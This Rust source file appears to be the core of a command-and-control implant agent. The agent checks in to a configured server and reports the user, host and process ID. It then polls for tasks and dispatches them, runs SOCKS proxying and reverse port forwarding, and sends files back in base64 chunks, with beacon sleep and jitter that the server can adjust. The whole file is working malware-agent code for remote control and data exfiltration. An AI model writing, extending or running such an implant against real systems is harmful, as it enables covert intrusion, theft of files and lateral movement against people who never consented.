use crate::{
    codec::{Codec, CodecError},
    commands,
    config::AgentConfig,
    protocol::{Checkin, CheckinReply, Download, GetTasking, TaskResponse, TaskingReply},
    proxy::{RpfwdManager, SocksManager},
    transport::{self, Transport, TransportError},
};
use base64::{engine::general_purpose::STANDARD, Engine};
use std::collections::HashMap;
use std::{env, process, thread, time::Duration};

const DOWNLOAD_CHUNK_SIZE: usize = 512_000;

struct PendingDownload {
    data: Vec<u8>,
}

#[derive(Debug)]
pub enum AgentError {
    Codec(CodecError),
    Transport(TransportError),
    Checkin,
}

impl From<CodecError> for AgentError {
    fn from(value: CodecError) -> Self {
        Self::Codec(value)
    }
}
impl From<TransportError> for AgentError {
    fn from(value: TransportError) -> Self {
        Self::Transport(value)
    }
}

pub struct Agent {
    config: AgentConfig,
    codec: Codec,
    transport: Box<dyn Transport>,
    callback_uuid: String,
    responses: Vec<TaskResponse>,
    socks: SocksManager,
    rpfwd: RpfwdManager,
    downloads: HashMap<String, PendingDownload>,
    exiting: bool,
}

impl Agent {
    pub fn new(config: AgentConfig) -> Result<Self, AgentError> {
        let codec = Codec::from_b64(&config.key_b64)?;
        let transport = transport::create(&config.transport, &config.endpoint, &config.uri)?;
        Ok(Self {
            callback_uuid: config.payload_uuid.clone(),
            config,
            codec,
            transport,
            responses: Vec::new(),
            socks: SocksManager::new(),
            rpfwd: RpfwdManager::new(),
            downloads: HashMap::new(),
            exiting: false,
        })
    }

    pub fn run(&mut self) -> Result<(), AgentError> {
        crate::diagnostic!("checking in");
        self.checkin()?;
        crate::diagnostic!("checkin succeeded callback={}", self.callback_uuid);
        loop {
            match self.cycle() {
                Ok(()) => crate::diagnostic!("tasking cycle succeeded"),
                Err(_error) => {
                    crate::diagnostic!("tasking cycle failed: {_error:?}");
                }
            }
            if self.exiting && self.responses.is_empty() {
                return Ok(());
            }
            thread::sleep(self.config.sleep_duration());
        }
    }

    fn checkin(&mut self) -> Result<(), AgentError> {
        let process_name = env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|v| v.to_string_lossy().into_owned()))
            .unwrap_or_default();
        let body = Checkin {
            action: "checkin",
            uuid: &self.config.payload_uuid,
            user: env::var("USERNAME").unwrap_or_default(),
            host: env::var("COMPUTERNAME").unwrap_or_default(),
            pid: process::id(),
            architecture: "x64",
            process_name,
        };
        let outbound = self.codec.encode(&self.config.payload_uuid, &body)?;
        crate::diagnostic!("sending checkin bytes={}", outbound.len());
        let inbound = self
            .transport
            .exchange(&outbound, Duration::from_secs(30))?;
        crate::diagnostic!("received checkin bytes={}", inbound.len());
        let (_, reply): (_, CheckinReply) = self.codec.decode(&inbound)?;
        if reply.status != "success" || reply.id.len() != 36 {
            return Err(AgentError::Checkin);
        }
        self.callback_uuid = reply.id;
        Ok(())
    }

    fn cycle(&mut self) -> Result<(), AgentError> {
        let request = GetTasking {
            action: "get_tasking",
            tasking_size: -1,
            get_delegate_tasks: true,
            responses: std::mem::take(&mut self.responses),
            socks: self.socks.drain(),
            rpfwd: self.rpfwd.drain(),
            delegates: Vec::new(),
        };
        let outbound = self.codec.encode(&self.callback_uuid, &request)?;
        crate::diagnostic!("sending tasking bytes={}", outbound.len());
        let inbound = self
            .transport
            .exchange(&outbound, Duration::from_secs(30))?;
        crate::diagnostic!("received tasking bytes={}", inbound.len());
        let (_, reply): (_, TaskingReply) = self.codec.decode(&inbound)?;
        self.handle_response_acks(reply.responses);
        self.socks.ingest(reply.socks);
        self.rpfwd.ingest(reply.rpfwd);
        for task in reply.tasks {
            let result = commands::dispatch(task);
            let task_id = result.response.task_id.clone();
            match result.action {
                commands::CommandAction::None => self.responses.push(result.response),
                commands::CommandAction::Exit => {
                    self.exiting = true;
                    self.responses.push(result.response);
                }
                commands::CommandAction::Sleep { interval, jitter } => {
                    self.config.interval_ms = interval.saturating_mul(1000);
                    self.config.jitter_pct = jitter;
                    self.responses.push(result.response);
                }
                commands::CommandAction::Rpfwd { start, port } => {
                    let applied = if start {
                        self.rpfwd.listen(port).map_err(|e| e.to_string())
                    } else {
                        self.rpfwd.stop(port);
                        Ok(())
                    };
                    self.responses.push(match applied {
                        Ok(()) => result.response,
                        Err(error) => error_response(task_id, error),
                    });
                }
                commands::CommandAction::Download { path, data } => {
                    let total_chunks = data.len().max(1).div_ceil(DOWNLOAD_CHUNK_SIZE) as u32;
                    self.downloads
                        .insert(task_id.clone(), PendingDownload { data });
                    self.responses.push(TaskResponse {
                        task_id,
                        completed: None,
                        status: None,
                        user_output: None,
                        download: Some(Download {
                            total_chunks: Some(total_chunks),
                            full_path: Some(path.clone()),
                            filename: std::path::Path::new(&path)
                                .file_name()
                                .map(|v| v.to_string_lossy().into_owned()),
                            chunk_size: Some(DOWNLOAD_CHUNK_SIZE as u32),
                            chunk_num: None,
                            file_id: None,
                            chunk_data: None,
                        }),
                    });
                }
            }
        }
        Ok(())
    }

    fn handle_response_acks(&mut self, acks: Vec<crate::protocol::ResponseAck>) {
        for ack in acks {
            if ack.status != "success" {
                if self.downloads.remove(&ack.task_id).is_some() {
                    self.responses.push(error_response(ack.task_id, ack.error));
                }
                continue;
            }
            let Some(download) = self.downloads.remove(&ack.task_id) else {
                continue;
            };
            if ack.file_id.is_empty() {
                self.responses.push(error_response(
                    ack.task_id,
                    "download registration returned no file id".into(),
                ));
                continue;
            }
            let chunks: Vec<&[u8]> = if download.data.is_empty() {
                vec![&[]]
            } else {
                download.data.chunks(DOWNLOAD_CHUNK_SIZE).collect()
            };
            let last = chunks.len();
            for (index, chunk) in chunks.into_iter().enumerate() {
                self.responses.push(TaskResponse {
                    task_id: ack.task_id.clone(),
                    completed: Some(index + 1 == last),
                    status: if index + 1 == last {
                        Some("success".into())
                    } else {
                        None
                    },
                    user_output: None,
                    download: Some(Download {
                        total_chunks: None,
                        full_path: None,
                        filename: None,
                        chunk_size: Some(DOWNLOAD_CHUNK_SIZE as u32),
                        chunk_num: Some((index + 1) as u32),
                        file_id: Some(ack.file_id.clone()),
                        chunk_data: Some(STANDARD.encode(chunk)),
                    }),
                });
            }
        }
    }
}

fn error_response(task_id: String, error: String) -> TaskResponse {
    TaskResponse {
        task_id,
        completed: Some(true),
        status: Some(format!("error: {error}")),
        user_output: Some(error),
        download: None,
    }
}
